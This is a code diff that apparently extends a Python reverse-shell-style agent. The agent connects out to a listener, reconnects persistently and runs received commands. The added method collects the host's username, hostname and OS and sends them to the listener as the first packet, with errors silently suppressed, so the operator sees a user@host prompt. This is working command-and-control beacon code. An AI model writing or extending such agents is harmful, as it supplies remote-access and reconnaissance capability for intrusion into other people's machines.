@@ -16,8 +16,10 @@ explicitly sends the 'exit' command or the process is interrupted.
 """
 
 import argparse
+import getpass
 import logging
 import os
+import platform
 import socket
 import subprocess
 import sys
@@ -106,6 +108,40 @@ class Agent:
                 exc,
             )
             return False
+
+    def _send_system_info(self) -> None:
+        """
+        Collect and send the agent's system information to the listener
+        as the very first packet after a successful connection.
+
+        Payload format (UTF-8 string):
+            ``<username>@<hostname>|<os_info>``
+
+        The listener parses this to build a dynamic CLI prompt.
+        Errors during collection are silently handled with fallback
+        defaults to avoid breaking the connection.
+        """
+        try:
+            username = getpass.getuser()
+        except Exception:
+            username = "unknown"
+
+        try:
+            hostname = socket.gethostname()
+        except Exception:
+            hostname = "unknown"
+
+        try:
+            os_info = f"{platform.system()} {platform.release()}"
+        except Exception:
+            os_info = "Unknown OS"
+
+        info_payload = f"{username}@{hostname}|{os_info}"
+        try:
+            self.sock.sendall(info_payload.encode("utf-8"))
+            logger.info("Sent system info: %s", info_payload)
+        except OSError as exc:
+            logger.error("Failed to send system info — %s", exc)
 
     # ------------------------------------------------------------------
     # Command execution helpers
@@ -447,7 +483,8 @@ class Agent:
                     time.sleep(RECONNECT_DELAY)
                     continue
 
-                # --- Connection established — enter command loop ---
+                # --- Connection established — send sysinfo & enter loop ---
+                self._send_system_info()
                 self._receive_loop()
 
                 # After the receive loop ends, clean up the current socket
